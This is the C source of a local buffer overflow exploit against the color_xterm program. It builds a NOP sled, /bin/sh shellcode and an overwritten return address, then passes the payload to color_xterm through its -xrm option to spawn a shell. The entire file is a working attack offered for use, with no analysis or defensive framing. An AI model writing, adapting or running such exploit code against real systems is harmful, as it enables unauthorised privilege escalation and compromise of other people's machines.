/* exploit for color_xterm, modified by zgv */
/* original exploit coded by Ming Zhang for the Chinese Version Of xTerm */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define BUFFER_SIZE 1024
#define DEFAULT_OFFSET 50
#define PATH_COLOR_XTERM "/usr/X11/bin/color_xterm" /* Default Path If Make Install Was Used */
#define NOP_SIZE 1

char nop[] = "\x90";

/* Shell Code For That Ass */
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

/* Lets d0 d1s */
void main(int argc,char **argv)
{
   char *buff = NULL;
   unsigned long *addr_ptr = NULL;
   char *ptr = NULL;
   int i,OffSet = DEFAULT_OFFSET;

   if (argc>1) OffSet = atoi(argv[1]);

   buff = malloc(2048);
   if(!buff)
   {
      printf("err0r err0r err0r err0r you g0t gn0 sk1lls er memory\n");
      exit(0);
   }
   ptr = buff;

   for (i = 0; i <= BUFFER_SIZE - strlen(shellcode) - NOP_SIZE; i+=NOP_SIZE) {
        memcpy (ptr,nop,NOP_SIZE);
        ptr+=NOP_SIZE;
   }

   for(i=0;i < strlen(shellcode);i++)
      *(ptr++) = shellcode[i];

   addr_ptr = (long *)ptr;
   for(i=0;i < (8/4);i++)
      *(addr_ptr++) = get_sp() + OffSet;
   ptr = (char *)addr_ptr;
   *ptr = 0;
   (void) fprintf(stderr,"bewm bash#\n");

    execl(PATH_COLOR_XTERM, "color_xterm_owns_me", "-xrm",buff, NULL);
}
